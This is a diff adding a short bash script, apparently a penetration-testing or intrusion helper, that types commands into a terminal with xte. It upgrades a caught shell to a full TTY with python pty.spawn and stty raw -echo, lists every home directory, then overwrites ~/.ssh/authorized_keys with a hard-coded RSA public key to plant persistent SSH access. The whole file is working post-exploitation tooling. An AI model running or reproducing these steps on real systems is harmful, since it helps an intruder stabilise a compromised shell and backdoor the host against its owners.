@@ -1,0 +1,31 @@
+#!/bin/bash
+
+source "/home/k4ndar3c/bin/functions.sh"
+
+#change_pane
+alt_tab
+command "python -c 'import pty;pty.spawn(\"/bin/bash\")' || python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+xte "sleep 1"
+sleep 1
+ctrl Z
+command "stty raw -echo"
+xte "sleep 1"
+sleep 1
+command "fg"
+xte "sleep 0.5"
+sleep 0.5
+xte "key Return"
+xte "sleep 0.5"
+sleep 0.5
+xte "key Return"
+xte "sleep 0.5"
+sleep 0.5
+command "export TERM=xterm"
+command "alias l='ls -Alh'"
+command "ls -lRAh /home/"
+xte "sleep 1"
+sleep 1
+command "mkdir ~/.ssh"
+xte "sleep 1"
+sleep .5
+command "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEkHPipD7PP80fzytQZfnPBsIE0JpCgCqXOxyGCkQBg/Ut880gWYLnSkGl10waCUqhkTfoFoIN6HWnEGo/GirlypLsw30k095SzLEw7AhnjwH7tXNC+kUf4GKtJyoieUZPQ6KdKOaqFsCMXhAPSlXFTDq7tm01UXVtWOQrIpG1V7QF+Vxnb1E6njdukJ/zYruTaxAvPKIqwbag41nmFndfb4i39uQCnpAiuWpO30sZExapDembOGx4U9tAveds+VN/0q2iPn5OZzKavybzXaw5BSEak3D3ji8w0x+2cFffQfO8RXLmcvn9kB3YA1nALm07dEjStBXmnM29SEGlwUU+LIEiS2+c5XN20+zxRWthTVed5azt71E9qFALHzKrVkVuZ66ksOoc68l/He+QHoZtecynr5qTpCdZr5+KEvs+w+Cksm8MrZNzKxjIBAVgY4B9J/404OhjNNPRzGj0elIon3GmZljea0/OaI9GTFnysEJa+hJgUlULLj56VJ6v8o8=' > ~/.ssh/authorized_keys"
